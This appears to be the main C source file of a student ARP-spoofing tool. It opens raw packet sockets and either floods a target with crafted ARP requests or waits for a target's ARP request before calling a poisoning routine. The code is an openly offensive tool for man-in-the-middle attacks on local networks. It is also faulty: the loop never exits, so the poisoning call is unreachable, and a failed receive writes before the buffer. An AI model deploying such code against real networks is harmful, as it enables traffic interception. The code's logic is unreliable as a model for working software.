//
// Created by tnoulens on 11/3/23.
//

#include "malcolm.h"

int g_packet_socket = -1;

void	tmp_handler(int sig, siginfo_t *info, void *context)
{
	(void)info;
	(void)context;
	if (sig == SIGINT)
	{
		if (g_packet_socket > -1 && close(g_packet_socket) == -1)
			error("Error: close() failed: ", errno, TRUE);
		fprintf(stdout, YELLOW"\nSIGINT received\n"RESET);
		exit(128 + SIGINT);
	}
}

void	signal_handling()
{
	struct sigaction	sa = {};

	sa.sa_flags = SA_RESTART;
	sigemptyset(&sa.sa_mask);
	sa.sa_sigaction = tmp_handler;
	sigaction(SIGINT, &sa, NULL);
}

void    choose_socket_type(t_data *data)
{
	if (BONUS == TRUE && (data->opt & REQUEST))
	{
		// Using DGRAM builds the ethernet header for me, no need to build from scratch
		g_packet_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
		if (g_packet_socket <= -1)
			error("socket() failed", errno, TRUE);
	}
	else
	{
		// Using RAW allow to receive raw packets
		g_packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
		if (g_packet_socket <= -1)
			error("socket() failed", errno, TRUE);
	}
}

int main(int argc, char **argv)
{
	t_data              data = {0};
	// we will use this to manipulate arp requests and replies
	t_arp_packet    req = {0};
	// we will use this buffer to receive packets
	uint8_t         buffer[MAX_BUF];
	// we will use this to broadcast to all MAC device
    const unsigned char ether_broadcast_addr[]= {0xff,0xff,0xff,0xff, 0xff,0xff};
    // this will contain the link layer address
	struct sockaddr_ll addr = {0};
	socklen_t   addr_len = sizeof(addr);

	welcome();
	signal_handling();
	init_checks(argc, argv, &data);
	choose_socket_type(&data);
	if (BONUS == TRUE && argc == 7 && !ft_strcmp(argv[6], "--verbose"))
		getHost(&data); // Hostname resolution
	else
		interface(&data); // Get interface data
	get_link_layer_addr(&data, ether_broadcast_addr, &addr);
	build_arp_request(&data, &req);
    printf("Using interface: %s of index: %d\n", data.interface, addr.sll_ifindex);
	if (BONUS == TRUE && (data.opt & REQUEST))
		printf("\nSending ARP request to poison target...\n\n");
	else
		printf("\nWaiting for ARP request...\n\n");
	while (TRUE)
	{
		if (BONUS == TRUE && (data.opt & REQUEST)) // check if we are on request attack
		{
			if (sendto(g_packet_socket, &req, sizeof(req), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1)
				error("sendto() failed", errno, TRUE);
			sleep(1);
		}
		else // else it is a REPLY attack
		{
			ssize_t buf_len;
			buf_len = recvfrom(g_packet_socket, buffer, 1001, 0, (struct sockaddr *)&addr, &addr_len);
			if (buf_len == -1)
				error("recvfrom() failed", errno, FALSE);
			buffer[buf_len] = 0;
			printf("Packet received, reading ethernet header...\n");
			struct ethhdr *eth_hdr = (struct ethhdr *)buffer;
			if (ntohs(eth_hdr->h_proto) == ETH_P_ARP)
				printf("ARP packet incoming...\n");
			else
				continue ;
			t_arp_packet *arp_request = (t_arp_packet *)(buffer + ETHER_HDR_LEN);
			if (ntohs(arp_request->arp_opcode) == ARPOP_REQUEST
				&& arp_request->arp_spa == data.target.sin_addr.s_addr
				&& arp_request->arp_dpa == data.source.sin_addr.s_addr)
				printf("ARP request received\nwho has %s, tell %s", inet_ntoa(data.source.sin_addr), inet_ntoa(data.target.sin_addr));
			else
				continue ;
		}
	}
	poison(&data);
	if (close(g_packet_socket) == -1)
		error("Error: close() failed: ", errno, TRUE);
	g_packet_socket = -1;
	return (0);
}